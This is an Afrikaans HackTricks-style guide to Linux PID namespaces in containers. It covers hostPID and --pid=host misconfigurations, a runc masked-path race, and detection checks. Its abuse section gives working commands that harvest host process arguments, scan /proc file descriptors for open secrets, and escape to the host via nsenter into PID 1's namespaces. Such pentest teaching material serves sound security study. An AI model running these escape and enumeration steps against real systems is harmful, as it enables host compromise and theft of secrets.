# PID-naamruimte

{{#include ../../../../../banners/hacktricks-training.md}}

## Oorsig

Die PID-naamruimte beheer hoe prosesse genommer word en watter prosesse sigbaar is. Daarom kan 'n container sy eie PID 1 hê, selfs al is dit nie 'n regte masjien nie. Binne die naamruimte sien die workload wat soos 'n plaaslike prosesboom lyk. Buite die naamruimte sien die host steeds die werklike host-PID's en die volledige proseslandskap.

Uit 'n security-oogpunt is die PID-naamruimte belangrik omdat prosessigbaarheid waardevol is. Sodra 'n workload host-prosesse kan sien, kan dit moontlik diensname, command-line-argumente, secrets wat in prosesargumente deurgegee word, omgewing-afgeleide state deur `/proc`, en potensiële namespace-entry-teikens waarneem. As dit meer kan doen as om net daardie prosesse te sien, byvoorbeeld deur seine te stuur of ptrace onder die regte omstandighede te gebruik, word die probleem baie ernstiger.

## Werking

'n Nuwe PID-naamruimte begin met sy eie interne prosesnommering. Die eerste proses wat daarin geskep word, word vanuit die naamruimte se oogpunt PID 1, wat ook beteken dat dit spesiale init-agtige semantiek vir weeskindprosesse en seinhantering kry. Dit verduidelik baie van die vreemde container-gedrag rondom init-prosesse, zombie-herwinning, en waarom klein init-wrappers soms in containers gebruik word.

Die belangrike security-les is dat 'n proses geïsoleerd kan lyk omdat dit slegs sy eie PID-boom sien, maar dat hierdie isolasie doelbewus verwyder kan word. Docker stel dit bloot deur `--pid=host`, terwyl Kubernetes dit deur `hostPID: true` doen. Sodra die container by die host se PID-naamruimte aansluit, sien die workload host-prosesse direk, en word baie latere aanvalspaaie veel meer realisties.

## Lab

Om 'n PID-naamruimte handmatig te skep:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Die shell sien nou ’n private proses-aansig. Die `--mount-proc`-flag is belangrik omdat dit ’n procfs-instansie koppel wat met die nuwe PID namespace ooreenstem, sodat die proseslys van binne af samehangend is.

Om container-gedrag te vergelyk:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Die verskil is onmiddellik en maklik om te verstaan, en daarom is dit ’n goeie eerste lab vir lesers.

## Runtime-gebruik

Normale containers in Docker, Podman, containerd en CRI-O kry hul eie PID-namespace. Kubernetes Pods ontvang gewoonlik ook ’n geïsoleerde PID-aansig, tensy die workload uitdruklik vir host-PID-sharing vra. LXC/Incus-omgewings maak op dieselfde kernel-primitief staat, hoewel system-container-gebruiksgevalle meer ingewikkelde prosesbome kan blootlê en meer debugging-kortpaaie kan aanmoedig.

Dieselfde reël geld oral: as die runtime gekies het om nie die PID-namespace te isoleer nie, is dit ’n doelbewuste vermindering in die container-grens.

## Misconfigurations

Die kanonieke misconfiguration is host-PID-sharing. Spanne regverdig dit dikwels vir debugging, monitoring of gerief met service management, maar dit moet altyd as ’n betekenisvolle security-uitsondering hanteer word. Selfs al het die container geen onmiddellike write primitive oor host-prosesse nie, kan sigbaarheid alleen baie oor die stelsel onthul. Sodra capabilities soos `CAP_SYS_PTRACE` of nuttige procfs-toegang bygevoeg word, brei die risiko aansienlik uit.

Nog ’n fout is om aan te neem dat host-PID-sharing daarom onskadelik is omdat die workload nie by verstek host-prosesse kan kill of ptrace nie. Daardie gevolgtrekking ignoreer die waarde van enumeration, die beskikbaarheid van namespace-entry-teikens en die manier waarop PID-sigbaarheid met ander verswakte kontroles kombineer.

## Abuse

As die host se PID-namespace gedeel word, kan ’n attacker host-prosesse inspekteer, prosesargumente harvest, interessante dienste identifiseer, kandidaat-PIDs vir `nsenter` opspoor, of prosessigbaarheid met ptrace-verwante privilege kombineer om met host- of naburige workloads in te meng. In sommige gevalle is dit genoeg om bloot die regte langlopende proses te sien om die res van die attack plan te hervorm.

Die eerste praktiese stap is altyd om te bevestig dat host-prosesse werklik sigbaar is:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Sodra host-PID's sigbaar is, word prosesargumente en namespace-entry-teikens dikwels die nuttigste inligtingsbron:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Indien `nsenter` beskikbaar is en voldoende voorregte bestaan, toets of ’n sigbare gasheerproses as ’n namespace-brug gebruik kan word:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Selfs wanneer toegang geblokkeer word, is die deel van die host se PID-ruimte reeds waardevol, omdat dit die diensuitleg, runtime-komponente en moontlike gepriviligeerde prosesse openbaar om vervolgens te teiken.

Sigbaarheid van die host se PID-ruimte maak misbruik van file descriptors ook meer realisties. As ’n gepriviligeerde host-proses of naburige workload ’n sensitiewe lêer of socket oop het, kan die aanvaller moontlik `/proc/<pid>/fd/` inspekteer en daardie handle hergebruik, afhangend van eienaarskap, procfs-mountopsies en die teikendiensmodel.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Hierdie opdragte is nuttig omdat hulle aandui of `hidepid=1` of `hidepid=2` die sigbaarheid tussen prosesse verminder, en of ooglopend interessante descriptors, soos oop geheimlêers, logs of Unix-sockets, enigsins sigbaar is.

### Volledige voorbeeld: host-PID + `nsenter`

Host-PID-deling word ’n direkte host escape wanneer die proses ook genoeg voorregte het om by die host se namespaces aan te sluit:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
As die opdrag slaag, voer die container-proses nou binne die host se mount-, UTS-, netwerk-, IPC- en PID-namespaces uit. Die impak is onmiddellike kompromittering van die host.

Selfs wanneer `nsenter` ontbreek, kan dieselfde resultaat moontlik deur die host se binary bereik word indien die host-lêerstelsel gemount is:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Onlangse Runtime-aantekeninge

Sommige aanvalle wat met PID-namespace verband hou, is nie tradisionele `hostPID: true`-miskonfigurasies nie, maar runtime-implementasiefoute rondom hoe procfs-beskermings tydens container-opstelling toegepas word.

#### `maskedPaths`-race na host procfs

In kwesbare `runc`-weergawes kon aanvallers wat die container-image of `runc exec`-workload kon beheer, die masking-fase omseil deur die container-kant se `/dev/null` te vervang met ’n simlink na ’n sensitiewe procfs-pad soos `/proc/sys/kernel/core_pattern`. As die race suksesvol was, kon die masked-path bind mount op die verkeerde teiken beland en host-globale procfs-knoppies aan die nuwe container blootstel.<sup>[[1]](#references)</sup>

Nuttige review command:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Dit is belangrik omdat die uiteindelike impak dieselfde as 'n direkte procfs exposure kan wees: skryfbare `core_pattern` of `sysrq-trigger`, gevolg deur code execution op die host of denial of service.

#### Namespace injection with `insject`

Namespace injection tools soos `insject` wys dat PID-namespace-interaksie nie altyd vereis dat die teiken-namespace vooraf betree word voordat process creation plaasvind nie. 'n Helper kan later attach, `setns()` gebruik en uitvoer terwyl sigbaarheid in die teiken se PID-space behoue bly:<sup>[[2]](#references)</sup>
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Hierdie soort tegniek is hoofsaaklik belangrik vir gevorderde debugging, offensive tooling en post-exploitation-werkvloei waar namespace-konteks aangesluit moet word nadat die runtime reeds die workload geïnisialiseer het.

### Verwante FD Abuse Patterns

Twee patrone verdien spesifieke vermelding wanneer host-PIDs sigbaar is. Eerstens kan ’n geprivilegieerde proses ’n sensitiewe file descriptor oop hou deur `execve()` heen omdat dit nie as `O_CLOEXEC` gemerk is nie. Tweedens kan dienste file descriptors oor Unix-sockets deur middel van `SCM_RIGHTS` stuur. In albei gevalle is die interessante objek nie meer die padnaam nie, maar die reeds-oop handle wat ’n proses met laer privileges kan erf of ontvang.

Dit is belangrik in container-werk omdat die handle na `docker.sock`, ’n geprivilegieerde log, ’n host-geheime lêer of ’n ander hoëwaarde-objek kan wys, selfs wanneer die pad self nie direk vanaf die container-lêerstelsel bereikbaar is nie.

## Kontroles

Die doel van hierdie opdragte is om vas te stel of die proses ’n private PID-aansig het en of dit reeds ’n veel breër proseslandskap kan opnoem.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Wat is interessant hier:

- As die proseslys ooglopende gasheerdienste bevat, is gasheer-PID-sharing waarskynlik reeds aktief.
- Om slegs ’n klein houer-plaaslike boom te sien, is die normale basislyn; om `systemd`, `dockerd` of onverwante daemons te sien, is nie.
- Sodra gasheer-PID's sigbaar is, word selfs leesalleen-prosesinligting nuttige verkenning.

As jy ontdek dat ’n houer met gasheer-PID-sharing loop, moenie dit as bloot ’n kosmetiese verskil beskou nie. Dit is ’n groot verandering in wat die werklading kan waarneem en moontlik beïnvloed.

## Verwysings

- [1] [runc-sekuriteitsadvies: houer-escape via "masked path"-misbruik weens mount-rastoestande (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Tool-vrystelling – insject: ’n Linux Namespace Injector](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)

{{#include ../../../../../banners/hacktricks-training.md}}
